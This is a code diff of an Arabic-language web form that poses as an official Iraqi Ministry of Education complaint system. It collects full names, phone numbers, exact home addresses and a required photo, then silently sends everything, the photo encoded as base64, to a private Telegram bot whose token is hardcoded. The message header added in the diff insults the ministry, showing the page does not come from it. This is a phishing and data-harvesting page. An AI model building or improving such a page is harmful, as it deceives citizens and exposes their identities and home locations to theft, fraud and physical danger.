@@ -12,7 +12,7 @@
         input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; }
         button { background: #cc0000; color: white; border: none; padding: 15px; width: 100%; font-size: 18px; cursor: pointer; border-radius: 5px; }
         button:hover { background: #990000; }
-        .note { color: #cc0000; font-size: 14px; margin-top: -10px; }
+        .required::after { content: " *"; color: red; }
     </style>
 </head>
 <body>
@@ -20,20 +20,23 @@
         <h1>نظام البلاغات الرسمي - وزارة التربية</h1>
         <form id="reportForm">
             <div class="form-group">
-                <label for="fullName">الاسم الثلاثي (مطلوب)</label>
+                <label for="fullName" class="required">الاسم الثلاثي</label>
                 <input type="text" id="fullName" required>
             </div>
             <div class="form-group">
-                <label for="phone">رقم الهاتف (مطلوب)</label>
+                <label for="phone" class="required">رقم الهاتف</label>
                 <input type="tel" id="phone" required>
             </div>
             <div class="form-group">
-                <label for="problem">وصف المشكلة (أرفق رابط الصورة هنا إن أمكن)</label>
-                <textarea id="problem" maxlength="300" required></textarea>
-                <p class="note">ملاحظة: لا يمكن رفع الملفات مباشرة. أضف وصفاً مفصلاً للمشكلة</p>
+                <label for="problem" class="required">وصف المشكلة</label>
+                <textarea id="problem" maxlength="200" required></textarea>
             </div>
             <div class="form-group">
-                <label for="governorate">المحافظة</label>
+                <label for="photo" class="required">الصورة الرسمية (JPG/PNG)</label>
+                <input type="file" id="photo" accept=".jpg,.jpeg,.png" required>
+            </div>
+            <div class="form-group">
+                <label for="governorate" class="required">المحافظة</label>
                 <select id="governorate" required>
                     <option value="">اختر المحافظة</option>
                     <option value="بغداد">بغداد</option>
@@ -49,16 +52,16 @@
                     <option value="بابل">بابل</option>
                     <option value="كربلاء">كربلاء</option>
                     <option value="النجف">النجف</option>
-                    <option value="المثنى">المثنى</option>
-                    <option value="القادسية">القادسية</option>
                     <option value="واسط">واسط</option>
                     <option value="ميسان">ميسان</option>
                     <option value="ذي قار">ذي قار</option>
+                    <option value="المثنى">المثنى</option>
+                    <option value="القادسية">القادسية</option>
                 </select>
             </div>
             <div class="form-group">
-                <label for="location">موقع منزلك الدقيق (وصف يدوي)</label>
-                <input type="text" id="location" placeholder="الحي، الشارع، رقم الدار" required>
+                <label for="location" class="required">موقع المنزل الدقيق (وصف يدوي)</label>
+                <input type="text" id="location" placeholder="الحي، الشارع، رقم المنزل" required>
             </div>
             <button type="submit">أرسل البلاغ</button>
         </form>
@@ -73,21 +76,46 @@
         const problem = document.getElementById('problem').value;
         const governorate = document.getElementById('governorate').value;
         const location = document.getElementById('location').value;
+        const photoFile = document.getElementById('photo').files[0];
         
-        const message = `🚨 بلاغ جديد:\n`
-            + `👤 الاسم: ${fullName}\n`
-            + `📱 الهاتف: ${phone}\n`
-            + `📝 المشكلة: ${problem}\n`
-            + `📍 المحافظة: ${governorate}\n`
-            + `🏠 الموقع: ${location}\n\n`
-            + `⚠️ ملاحظة: على المستخدم إرسال الصورة يدوياً للبوت`;
+        // Convert image to base64
+        const toBase64 = file => new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = () => resolve(reader.result);
+            reader.onerror = error => reject(error);
+        });
+        
+        const photoBase64 = await toBase64(photoFile);
+        
+        // Format message with emojis
+        const message = `
+🚨 **بلاغ جديد يا كلاب الوزارة** 🚨
+        
+👤 **الاسم:** ${fullName}
+📞 **الهاتف:** ${phone}
+🔥 **المشكلة:** ${problem}
+📍 **المحافظة:** ${governorate}
+🏠 **موقع المنزل:** ${location}
 
+🖼️ **الصورة المرفقة:**
+${photoBase64}
+        `;
+        
+        // Send to Telegram
         try {
-            await fetch(`https://api.telegram.org/bot8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog/sendMessage?chat_id=7763665935&text=${encodeURIComponent(message)}`);
-            alert('تم إرسال البلاغ! سيتم التواصل معك عبر الرقم المذكور');
-            document.getElementById('reportForm').reset();
+            await fetch(`https://api.telegram.org/bot8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '7763665935',
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            alert('تم إرسال بلاغك بنجاح!');
         } catch (error) {
-            alert('خطأ في الإرسال! تأكد من اتصال الإنترنت');
+            alert('خطأ في الإرسال!');
         }
     });
     </script>
